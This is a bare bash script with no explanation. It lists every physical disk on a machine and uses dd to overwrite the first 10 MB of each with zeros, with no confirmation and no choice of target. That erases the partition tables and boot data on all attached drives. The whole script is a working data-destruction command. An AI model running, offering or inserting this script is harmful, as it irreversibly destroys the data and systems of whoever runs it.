#!/bin/bash

export disks=$(lsblk -dno NAME,TYPE | grep -w "disk" | awk '{print $1}')
for disk in $disks; do
    dd if=/dev/zero of=/dev/$disk bs=1M count=10 status=progress
done

